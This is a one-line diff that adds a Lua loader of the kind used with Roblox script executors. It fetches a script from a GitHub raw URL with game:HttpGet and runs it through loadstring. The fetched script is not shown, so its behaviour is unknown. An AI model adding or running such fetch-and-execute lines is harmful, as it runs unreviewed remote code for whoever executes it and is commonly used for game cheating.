@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/liebertsx/Files/main/lua/sbbygrg.lua",true))()
